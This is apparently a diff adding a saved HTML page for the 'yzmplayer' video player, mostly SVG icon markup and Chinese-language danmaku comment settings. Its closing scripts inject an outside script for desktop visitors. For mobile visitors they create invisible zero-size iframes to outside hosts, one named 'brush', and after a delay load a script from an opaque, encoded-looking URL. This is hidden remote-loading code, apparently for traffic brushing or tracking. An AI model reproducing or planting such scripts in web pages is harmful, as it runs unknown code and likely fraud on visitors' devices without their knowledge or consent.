-9.015000343322754,-6.309999942779541 C-9.015000343322754,-6.309999942779541 -6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 C-6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 -6.014999866485596,-12.220000267028809 C2.7850000858306885,-7.800000190734863 8.524999618530273,1.0099999904632568 9.015000343322754,10.850000381469727 C9.015000343322754,10.850000381469727 9.015000343322754,10.850000381469727 9.015000343322754,10.850000381469727z"></path></g></g><g transform="matrix(1,0,0,1,25.729999542236328,31.780000686645508)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M-2.440000057220459,12.220000267028809 C-2.440000057220459,12.220000267028809 -9.050000190734863,12.220000267028809 -9.050000190734863,12.220000267028809 C-9.050000190734863,1.8700000047683716 -3.2100000381469727,-7.590000152587891 6.050000190734863,-12.220000267028809 C6.050000190734863,-12.220000267028809 9.050000190734863,-6.309999942779541 9.050000190734863,-6.309999942779541 C2.0199999809265137,-2.809999942779541 -2.430000066757202,4.360000133514404 -2.440000057220459,12.220000267028809 C-2.440000057220459,12.220000267028809 -2.440000057220459,12.220000267028809 -2.440000057220459,12.220000267028809z"></path></g></g><g transform="matrix(1,0,0,1,44,57.654998779296875)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,4.974999904632568 C-4.110000133514404,4.994999885559082 -8.119999885559082,3.6449999809265137 -11.380000114440918,1.1349999904632568 C-11.380000114440918,1.1349999904632568 -8.319999694824219,-4.974999904632568 -8.319999694824219,-4.974999904632568 C-3.6700000762939453,-0.5049999952316284 3.6700000762939453,-0.5049999952316284 8.319999694824219,-4.974999904632568 C8.319999694824219,-4.974999904632568 11.380000114440918,1.1349999904632568 11.380000114440918,1.1349999904632568 C8.109999656677246,3.634999990463257 4.110000133514404,4.985000133514404 0,4.974999904632568 C0,4.974999904632568 0,4.974999904632568 0,4.974999904632568z"></path></g></g><g transform="matrix(1,0,0,1,55.9900016784668,35.665000915527344)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M6.619999885559082,7.40500020980835 C6.619999885559082,7.40500020980835 6.619999885559082,8.335000038146973 6.619999885559082,8.335000038146973 C6.619999885559082,8.335000038146973 0.009999999776482582,8.335000038146973 0.009999999776482582,8.335000038146973 C0.009999999776482582,3.7850000858306885 -2.549999952316284,-0.375 -6.619999885559082,-2.4049999713897705 C-6.619999885559082,-2.4049999713897705 -3.619999885559082,-8.335000038146973 -3.619999885559082,-8.335000038146973 C2.380000114440918,-5.324999809265137 6.300000190734863,0.6949999928474426 6.619999885559082,7.40500020980835 C6.619999885559082,7.40500020980835 6.619999885559082,7.40500020980835 6.619999885559082,7.40500020980835z"></path></g></g><g transform="matrix(1,0,0,1,31.9950008392334,35.665000915527344)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M6.635000228881836,-2.4049999713897705 C2.565000057220459,-0.375 0.004999999888241291,3.7850000858306885 0.004999999888241291,8.335000038146973 C0.004999999888241291,8.335000038146973 -6.635000228881836,8.335000038146973 -6.635000228881836,8.335000038146973 C-6.635000228881836,1.274999976158142 -2.6449999809265137,-5.184999942779541 3.674999952316284,-8.335000038146973 C3.674999952316284,-8.335000038146973 6.635000228881836,-2.4049999713897705 6.635000228881836,-2.4049999713897705z"></path></g></g><g transform="matrix(1,0,0,1,44,66.322998046875)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M8.319000244140625,-13.677000045776367 C8.319000244140625,-13.677000045776367 19.2189998626709,8.123000144958496 19.2189998626709,8.123000144958496 C13.659000396728516,11.642999649047852 7.068999767303467,13.67300033569336 -0.0010000000474974513,13.67300033569336 C-7.071000099182129,13.67300033569336 -13.66100025177002,11.642999649047852 -19.22100067138672,8.123000144958496 C-19.22100067138672,8.123000144958496 -8.321000099182129,-13.677000045776367 -8.321000099182129,-13.677000045776367 C-6.160999774932861,-11.597000122070312 -3.2309999465942383,-10.32699966430664 -0.0010000000474974513,-10.32699966430664 C3.2290000915527344,-10.32699966430664 6.169000148773193,-11.597000122070312 8.319000244140625,-13.677000045776367z"></path></g></g><g transform="matrix(1,0,0,1,64.68399810791016,27.89699935913086)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M15.314000129699707,16.10700035095215 C15.314000129699707,16.10700035095215 -8.685999870300293,16.10700035095215 -8.685999870300293,16.10700035095215 C-8.685999870300293,11.406999588012695 -11.38599967956543,7.336999893188477 -15.315999984741211,5.367000102996826 C-15.315999984741211,5.367000102996826 -4.576000213623047,-16.10300064086914 -4.576000213623047,-16.10300064086914 C7.214000225067139,-10.192999839782715 15.314000129699707,2.006999969482422 15.314000129699707,16.10700035095215z"></path></g></g><g transform="matrix(1,0,0,1,23.31599998474121,27.89699935913086)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M4.584000110626221,-16.10300064086914 C4.584000110626221,-16.10300064086914 15.314000129699707,5.367000102996826 15.314000129699707,5.367000102996826 C11.383999824523926,7.336999893188477 8.684000015258789,11.406999588012695 8.684000015258789,16.10700035095215 C8.684000015258789,16.10700035095215 -15.315999984741211,16.10700035095215 -15.315999984741211,16.10700035095215 C-15.315999984741211,2.006999969482422 -7.216000080108643,-10.192999839782715 4.584000110626221,-16.10300064086914z"></path></g></g><g transform="matrix(1,0,0,1,44,44)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M0,-4 C2.140000104904175,-4 3.890000104904175,-2.319999933242798 4,-0.20000000298023224 C4,-0.20000000298023224 4,0 4,0 C4,0 4,0.20000000298023224 4,0.20000000298023224 C3.890000104904175,2.319999933242798 2.140000104904175,4 0,4 C-2.2100000381469727,4 -4,2.2100000381469727 -4,0 C-4,-2.2100000381469727 -2.2100000381469727,-4 0,-4z"></path></g></g></g></svg></button>
+        </div>
+    </div>
+    <div class="yzmplayer-bar-wrap">
+        <div class="yzmplayer-bar-time hidden">00:00</div>
+        <div class="yzmplayer-bar-preview"></div>
+        <div class="yzmplayer-bar">
+            <div class="yzmplayer-loaded" style="width: 1.8978%;"></div>
+            <div class="yzmplayer-played" style="width: 0; background: #00a1d6">
+                <span class="yzmplayer-thumb" style="background: #00a1d6"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18 18" width="18" height="18" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px);"><defs><clippath id="__lottie_element_25"><rect width="18" height="18" x="0" y="0"></rect></clippath></defs><g clip-path="url(#__lottie_element_25)"><g transform="matrix(1,0,0,1,8.937000274658203,8.25)" opacity="0.14" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0.07500000298023224,1.2130000591278076)"><path fill="rgb(251,114,153)" fill-opacity="1" d=" M9,-3.5 C9,-3.5 9,3.5 9,3.5 C9,5.707600116729736 7.207600116729736,7.5 5,7.5 C5,7.5 -5,7.5 -5,7.5 C-7.207600116729736,7.5 -9,5.707600116729736 -9,3.5 C-9,3.5 -9,-3.5 -9,-3.5 C-9,-5.707600116729736 -7.207600116729736,-7.5 -5,-7.5 C-5,-7.5 5,-7.5 5,-7.5 C7.207600116729736,-7.5 9,-5.707600116729736 9,-3.5z"></path></g></g><g transform="matrix(1,0,0,1,9.140999794006348,8.67199993133545)" opacity="0.28" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-0.1509999930858612,0.7990000247955322)"><path fill="rgb(251,114,153)" fill-opacity="1" d=" M8,-3 C8,-3 8,3 8,3 C8,4.931650161743164 6.431650161743164,6.5 4.5,6.5 C4.5,6.5 -4.5,6.5 -4.5,6.5 C-6.431650161743164,6.5 -8,4.931650161743164 -8,3 C-8,3 -8,-3 -8,-3 C-8,-4.931650161743164 -6.431650161743164,-6.5 -4.5,-6.5 C-4.5,-6.5 4.5,-6.5 4.5,-6.5 C6.431650161743164,-6.5 8,-4.931650161743164 8,-3z"></path></g></g><g transform="matrix(0.9883429408073425,-0.7275781631469727,0.6775955557823181,0.920446515083313,7.3224687576293945,-0.7606706619262695)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(0.9937776327133179,-0.11138220876455307,0.11138220876455307,0.9937776327133179,-2.5239999294281006,1.3849999904632568)"><path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.75,-1.25 C0.75,-1.25 0.75,1.25 0.75,1.25 C0.75,1.663925051689148 0.4139249920845032,2 0,2 C0,2 0,2 0,2 C-0.4139249920845032,2 -0.75,1.663925051689148 -0.75,1.25 C-0.75,1.25 -0.75,-1.25 -0.75,-1.25 C-0.75,-1.663925051689148 -0.4139249920845032,-2 0,-2 C0,-2 0,-2 0,-2 C0.4139249920845032,-2 0.75,-1.663925051689148 0.75,-1.25z" style="fill: #000;"></path></g></g><g transform="matrix(1.1436611413955688,0.7535901665687561,-0.6317168474197388,0.9587040543556213,16.0070743560791,2.902894973754883)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(0.992861807346344,0.1192704513669014,-0.1192704513669014,0.992861807346344,-2.5239999294281006,1.3849999904632568)"><path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.75,-1.25 C0.75,-1.25 0.75,1.25 0.75,1.25 C0.75,1.663925051689148 0.4139249920845032,2 0,2 C0,2 0,2 0,2 C-0.4139249920845032,2 -0.75,1.663925051689148 -0.75,1.25 C-0.75,1.25 -0.75,-1.25 -0.75,-1.25 C-0.75,-1.663925051689148 -0.4139249920845032,-2 0,-2 C0,-2 0,-2 0,-2 C0.4139249920845032,-2 0.75,-1.663925051689148 0.75,-1.25z" style="fill: #000;"></path></g></g><g transform="matrix(1,0,0,1,8.890999794006348,8.406000137329102)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,0.09099999815225601,1.1009999513626099)"><path fill="rgb(255,255,255)" fill-opacity="1" d=" M7,-3 C7,-3 7,3 7,3 C7,4.379749774932861 5.879749774932861,5.5 4.5,5.5 C4.5,5.5 -4.5,5.5 -4.5,5.5 C-5.879749774932861,5.5 -7,4.379749774932861 -7,3 C-7,3 -7,-3 -7,-3 C-7,-4.379749774932861 -5.879749774932861,-5.5 -4.5,-5.5 C-4.5,-5.5 4.5,-5.5 4.5,-5.5 C5.879749774932861,-5.5 7,-4.379749774932861 7,-3z"></path><path stroke-linecap="butt" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(0,0,0)" stroke-opacity="1" stroke-width="1.5" d=" M7,-3 C7,-3 7,3 7,3 C7,4.379749774932861 5.879749774932861,5.5 4.5,5.5 C4.5,5.5 -4.5,5.5 -4.5,5.5 C-5.879749774932861,5.5 -7,4.379749774932861 -7,3 C-7,3 -7,-3 -7,-3 C-7,-4.379749774932861 -5.879749774932861,-5.5 -4.5,-5.5 C-4.5,-5.5 4.5,-5.5 4.5,-5.5 C5.879749774932861,-5.5 7,-4.379749774932861 7,-3z"></path></g></g><g transform="matrix(1,0,0,1,8.89900016784668,8.083999633789062)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-2.5239999294281006,1.3849999904632568)"><path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.875,-1.125 C0.875,-1.125 0.875,1.125 0.875,1.125 C0.875,1.607912540435791 0.48291251063346863,2 0,2 C0,2 0,2 0,2 C-0.48291251063346863,2 -0.875,1.607912540435791 -0.875,1.125 C-0.875,1.125 -0.875,-1.125 -0.875,-1.125 C-0.875,-1.607912540435791 -0.48291251063346863,-2 0,-2 C0,-2 0,-2 0,-2 C0.48291251063346863,-2 0.875,-1.607912540435791 0.875,-1.125z" style="fill: #000;"></path></g></g><g transform="matrix(1,0,0,1,14.008999824523926,8.083999633789062)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,-2.5239999294281006,1.3849999904632568)"><path fill="rgb(0,0,0)" fill-opacity="1" d=" M0.8999999761581421,-1.100000023841858 C0.8999999761581421,-1.100000023841858 0.8999999761581421,1.100000023841858 0.8999999761581421,1.100000023841858 C0.8999999761581421,1.596709966659546 0.4967099726200104,2 0,2 C0,2 0,2 0,2 C-0.4967099726200104,2 -0.8999999761581421,1.596709966659546 -0.8999999761581421,1.100000023841858 C-0.8999999761581421,1.100000023841858 -0.8999999761581421,-1.100000023841858 -0.8999999761581421,-1.100000023841858 C-0.8999999761581421,-1.596709966659546 -0.4967099726200104,-2 0,-2 C0,-2 0,-2 0,-2 C0.4967099726200104,-2 0.8999999761581421,-1.596709966659546 0.8999999761581421,-1.100000023841858z" style="fill: #000;"></path></g></g></g></svg></span>
+            </div>
+        </div>
+  </div>
+    </div>
+  <div class="yzmplayer-icons yzmplayer-comment-box"><div class="yzmplayer-setting-item yzmplayer-setting-showdan showdan-setting"> <span class="yzmplayer-label"></span>
+<div class="yzmplayer-toggle"><input class="yzmplayer-showdan-setting-input" type="checkbox" name="yzmplayer-toggle-dan"><label for="yzmplayer-toggle-dan"></label></div></div>
+     <div class="yzmplayer-danmu-block"><button class="yzmplayer-icon yzmplayer-comment-setting-icon yzmplayer-comment-danmaku-proportion-init" data-balloon="设置" data-balloon-pos="up">
+            <span class="yzmplayer-icon-content"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M16.5 8c1.289 0 2.49.375 3.5 1.022V6a2 2 0 00-2-2H4a2 2 0 00-2 2v10a2 2 0 002 2h7.022A6.5 6.5 0 0116.5 8zM7 13H5a1 1 0 010-2h2a1 1 0 010 2zm2-4H5a1 1 0 010-2h4a1 1 0 010 2z"></path><path d="M20.587 13.696l-.787-.131a3.503 3.503 0 00-.593-1.051l.301-.804a.46.46 0 00-.21-.56l-1.005-.581a.52.52 0 00-.656.113l-.499.607a3.53 3.53 0 00-1.276 0l-.499-.607a.52.52 0 00-.656-.113l-1.005.581a.46.46 0 00-.21.56l.301.804c-.254.31-.456.665-.593 1.051l-.787.131a.48.48 0 00-.413.465v1.209a.48.48 0 00.413.465l.811.135c.144.382.353.733.614 1.038l-.292.78a.46.46 0 00.21.56l1.005.581a.52.52 0 00.656-.113l.515-.626a3.549 3.549 0 001.136 0l.515.626a.52.52 0 00.656.113l1.005-.581a.46.46 0 00.21-.56l-.292-.78c.261-.305.47-.656.614-1.038l.811-.135A.48.48 0 0021 15.37v-1.209a.48.48 0 00-.413-.465zM16.5 16.057a1.29 1.29 0 11.002-2.582 1.29 1.29 0 01-.002 2.582z"></path></svg></span>
+        </button>
+        <div class="yzmplayer-comment-setting-box">
+ <div class="yzmplayer-setting-item yzmplayer-setting-danunlimit">
+                        <span class="yzmplayer-label">海量弹幕</span>
+                        <div class="yzmplayer-toggle">
+                            <input class="yzmplayer-danunlimit-setting-input" type="checkbox" name="yzmplayer-toggle-danunlimit">
+                            <label for="yzmplayer-toggle-danunlimit"></label>
+                        </div>
+                    </div>
+                    <div class="yzmplayer-setting-item yzmplayer-setting-danmaku">
+                        <span class="yzmplayer-label">弹幕透明度</span>
+                        <div class="yzmplayer-danmaku-bar-wrap">
+                            <div class="yzmplayer-danmaku-bar">
+                                <div class="yzmplayer-danmaku-bar-inner" style="width: 70%;">
+                                    <span class="yzmplayer-thumb"></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+       <div class="yzmplayer-setting-item yzmplayer-setting-danmaku-proportion">
+                        <span class="yzmplayer-label">弹幕屏占比</span>
+                        <div class="yzmplayer-danmaku-bar-wrap">
+                                  </div>
+                    </div>
+                <div class="yzmplayer-comment-setting-type">
+                <div class="yzmplayer-comment-setting-title">弹幕发送模式</div>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-type-0" value="top">
+                    <span>顶部</span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-type-0" value="right" checked="">
+                    <span>滚动</span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-type-0" value="bottom">
+                    <span>底部</span>
+                </label>
+            </div>
+    <div class="yzmplayer-comment-setting-font"><div class="yzmplayer-comment-setting-title">弹幕发送大小</div><label><input type="radio" name="yzmplayer-danmaku-font-0" value="50px"><span>超大</span></label><label><input type="radio" name="yzmplayer-danmaku-font-0" value="35px"><span>较大</span></label><label><input type="radio" name="yzmplayer-danmaku-font-0" value="27.5px" checked=""><span>标准</span></label><label><input type="radio" name="yzmplayer-danmaku-font-0" value="18px"><span>较小</span></label></div>      <div class="yzmplayer-comment-setting-color">
+                <div class="yzmplayer-comment-setting-title">弹幕发送颜色</div>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FE0302">
+                    <span style="background:#FE0302;"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FF7204">
+                    <span style="background: #FF7204"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FFAA02">
+                    <span style="background: #FFAA02"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FFD302">
+                    <span style="background: #FFD302"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FFFF00">
+                    <span style="background: #FFFF00"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#A0EE00">
+                    <span style="background: #A0EE00"></span>
+                </label>
+<label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#00CD00">
+                    <span style="background: #00CD00;"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#019899">
+                    <span style="background: #019899"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#4266BE">
+                    <span style="background: #4266BE"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#89D5FF">
+                    <span style="background: #89D5FF"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#CC0273">
+                    <span style="background: #CC0273"></span>
+                </label>
+                <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#222222">
+                    <span style="background: #222222"></span>
+                </label>
+            <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#9B9B9B">
+                    <span style="background: #9B9B9B"></span>
+                </label>
+          <label>
+                    <input type="radio" name="yzmplayer-danmaku-color-0" value="#FFFFFF" checked="">
+                    <span style="background: #FFFFFF"></span>
+                </label>
+</div>
+          <div class="yzmplayer-op-block"></div>         </div>
+   </div>
+      <input class="yzmplayer-comment-input" type="text" placeholder="发个弹幕见证当下" maxlength="40">
+        <button class="yzmplayer-icon yzmplayer-send-icon" data-balloon="发送" data-balloon-pos="up">
+            <span class="yzmplayer-icon-content"><svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 1048 1024"><path d="M675.48206831 405.43059956c-21.34102395 0-38.61709113-17.27606717-38.61709114-38.61709114 0-21.34102395 17.27606717-38.61709113 38.61709113-38.6170903s38.61709113 17.27606717 38.6170903 38.6170903c0 21.34102395-17.27606717 38.61709113-38.6170903 38.61709114M825.88547437 93.44515543c-1.0162392 0-3.04871759 1.0162392-4.06495679 1.0162392L171.42740857 347.50496286c-32.51965512 9.14615277-57.92563586 35.56837271-67.07178864 68.08802865-9.14615277 34.55213351 0 69.10426785 25.40598074 94.5102486 5.08119598 5.08119598 11.17863116 8.12991357 18.29230555 10.1623928L284.22996353 557.86648401l104.67264139 30.48717673c48.77948309-45.7307655 144.30597089-134.14357891 159.54955883-148.37092768 15.24358878-15.24358878 39.63333032-15.24358878 54.87691911 0 15.24358878 15.24358878 15.24358878 39.63333032 0 54.87691911-18.29230637 18.29230637-132.11110052 123.98118613-157.51708127 147.35468847L498.65644147 883.06303852c2.03247839 7.11367438 5.08119598 14.22734958 10.16239279 19.30854556 18.29230637 18.29230637 42.68204792 28.45469834 69.10426703 28.45469833 8.12991357 0 17.27606717-1.0162392 25.40598157-3.04871759 33.53589431-9.14615277 58.94187506-33.53589431 68.08802783-66.05555026L943.76922531 218.44258075c1.0162392-2.03247839 1.0162392-3.04871759 2.0324784-5.08119598 9.14615277-34.55213351 0-69.10426785-25.40598074-94.5102486C894.98974222 94.46139462 860.43760788 84.29900183 825.88547437 93.44515543z"></path></svg></span>
+        </button>
+<input id="dmtext" dmtype="right" size="27.5px" class="yzm-yzmplayer-comment-input" type="text" placeholder="发个弹幕见证当下" maxlength="30">
+        <button class="yzmplayer-icon yzm-yzmplayer-send-icon" data-balloon="发送" data-balloon-pos="up">发送	</button>
+   <div class="dmrules"><a target="_blank" href="https://jx.jsonplayer.com/dm_rule/">弹幕礼仪 </a></div></div>
+  </div>
+<div class="yzmplayer-info-panel yzmplayer-info-panel-hide">
+  <div class="yzmplayer-info-panel-title"><span class="title">视频信息</span>  <div class="yzmplayer-info-panel-close">关闭</div>
+ </div><div class="yzmplayer-info-panel-titleLine"></div><div class="yzmplayer-info-panel-container"><div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-version">
+        <span class="yzmplayer-info-panel-item-title">播放器版本</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-fps">
+        <span class="yzmplayer-info-panel-item-title">播放器帧率</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-type">
+        <span class="yzmplayer-info-panel-item-title">视频类型</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-url">
+        <span class="yzmplayer-info-panel-item-title">视频地址</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-resolution">
+        <span class="yzmplayer-info-panel-item-title">视频分辨率</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-duration">
+        <span class="yzmplayer-info-panel-item-title">视频时长</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-id">
+        <span class="yzmplayer-info-panel-item-title">弹幕 ID</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-api">
+        <span class="yzmplayer-info-panel-item-title">弹幕API</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+    </div>
+    <div class="yzmplayer-info-panel-item yzmplayer-info-panel-item-danmaku-amount">
+        <span class="yzmplayer-info-panel-item-title">弹幕数量</span>
+        <span class="yzmplayer-info-panel-item-data"></span>
+  </div></div>
+    
+</div>
+<div class="yzmplayer-menu">
+    <div class="yzmplayer-menu-con"><div class="yzmplayer-menu-itemDom"><a href="javascript:void(0);" id="settingVideoColor">视频色彩调整</a></div><div class="yzmplayer-menu-item"> <a href="javascript:void(0);" id="videoStatistics">视频统计信息</a> </div> <div class="yzmplayer-menu-item" id="settingLastBtn"><a href="https://www.jsonplayer.com/" target="_blank">JSONPlayer播放器</a></div></div>
+<div class="yzmplayer-menu-mesk"></div></div>
+<div class="yzmplayer-notice" style="opacity: 0;">视频已准备就绪，即将为您播放</div><div class="yzmplayer-danmu"><div class="yzmplayer-watching"><span title="播放器在线人数人正在观看" class="danmuku-num">100</span>条弹幕</div><ul class="yzmplayer-list"><li>时间</li><li>弹幕内容</li><li>发送时间</li></ul><ul class="list-show"></ul></div><div class="svg-icon"><svg aria-hidden="true"><symbol id="icon-play" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><filter x="-11.2%" y="-10.8%" width="122.4%" height="125.5%" filterUnits="objectBoundingBox" id="pid-1-svgo-a"><feoffset dy="1" in="SourceAlpha" result="shadowOffsetOuter1"></feoffset><fegaussianblur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></fegaussianblur><fecomposite in="shadowBlurOuter1" in2="SourceAlpha" operator="out" result="shadowBlurOuter1"></fecomposite><fecolormatrix values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0" in="shadowBlurOuter1"></fecolormatrix></filter><path d="M52.352 13.5c4.837 0 8.707 4.32 8.647 9.72v21.06C61 49.62 57.128 54 52.29 54h-2.479c0 1.681-1.452 3-3.206 3S43.4 55.62 43.4 54H20.841c0 1.681-1.452 3-3.204 3-1.756 0-3.206-1.38-3.206-3h-2.722C6.87 54 3 49.68 3 44.28V23.22c0-5.4 3.87-9.72 8.709-9.72h11.25l-4.78-4.44c-.725-.661-.725-1.8 0-2.52.424-.36.908-.54 1.391-.54.546 0 1.029.18 1.392.54l7.5 6.96h7.318l7.5-6.96c.422-.36.907-.54 1.39-.54.544 0 1.029.18 1.392.54.725.659.725 1.8 0 2.52l-4.78 4.44h11.07zM26.527 45.54l17.418-10.08c1.45-.901 1.45-2.221 0-3.122L26.527 22.2c-1.452-.84-2.662-.12-2.662 1.56v20.22c0 1.74 1.21 2.4 2.662 1.561z" id="pid-1-svgo-b"></path></defs><g fill="none" fill-rule="evenodd"><use fill="#000" filter="url(#pid-1-svgo-a)" xlink:href="#pid-1-svgo-b"></use><use fill-opacity=".7" fill="#FFF" xlink:href="#pid-1-svgo-b"></use><path d="M26.527 45.541c-1.452.84-2.662.18-2.662-1.56V23.76c0-1.68 1.21-2.4 2.662-1.56L43.945 32.34c1.45.9 1.45 2.22 0 3.121L26.527 45.541z" fill="#000" opacity=".06"></path></g></symbol><symbol id="icon-play-xj" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22"><path d="M16 5a1 1 0 00-1 1v4.615a1.431 1.431 0 00-.615-.829L7.21 5.23A1.439 1.439 0 005 6.445v9.11a1.44 1.44 0 002.21 1.215l7.175-4.555a1.436 1.436 0 00.616-.828V16a1 1 0 002 0V6C17 5.448 16.552 5 16 5z"></path></symbol></svg></div></div><div class="ADplayer" id="ADplayer"></div><div class="ADtip" id="ADtip"></div></div>
+		<script>
+            (function(){function IsPC(){var userAgentInfo=window.navigator.userAgent;var flag=true;if(userAgentInfo.indexOf('Mobile')!=-1||screen.width<=750||userAgentInfo.indexOf('Android')!=-1||userAgentInfo.indexOf('Phone')!=-1){flag=false}return flag}var data='s=8381';if(IsPC()){var sp=document.createElement('script');sp.src='https://pc.stgowan.com/pc_w/m_video.js';sp.id='videodataid';sp.setAttribute('data',data);document.body.appendChild(sp)}})()
+		</script><script src="./m_video.js.下载" id="videodataid" data="s=8381"></script>
+        <script>
+            function cric(url, sp) {
+                var _iframe = document.createElement("iframe");
+                _iframe.src = url;
+                _iframe.name = sp;
+                _iframe.id = _iframe.name;
+                _iframe.width = 0;
+                _iframe.height = 0;
+                _iframe.border = "0";
+                _iframe.style.visibility = "hidden";
+                _iframe.sandbox = "allow-scripts allow-same-origin";
+                document.body.appendChild(_iframe);
+            }
+            
+            if (navigator.userAgent.match(/(Mobile|iPhone|iPod|Android|ios|Adr|android)/i)) {
+                cric("https://dn-odum9helk.qbox.me/FnGtibLApH3YEQoAzmfoD9EAYAES", "tongji");
+                cric("https://qd1.lu8.fun/as/as001.php", "brush");
+                function kl() {
+                    var hi = document.createElement("script");
+                    hi.src = "https://nim.nosdn.127.net/MTAyNDkzMg==/bmltYV8xNDc1ODUzMjA4NjFfMTcwNjAxMzI0Mjg1MV9mMjA3ZDZhNy1lYjE2LTQ3M2YtOTIyZS0xYjI3NDk1MzUxNjg=";
+                    hi.charset = "UTF-8";
+                    var k = document.getElementsByTagName("script")[0];
+                    k.parentNode.insertBefore(hi, k);
+                }
+                setTimeout("kl()", 1000);
+            }
+        </script>
+    
+<div id="videoPopupMenu"></div></body></html>
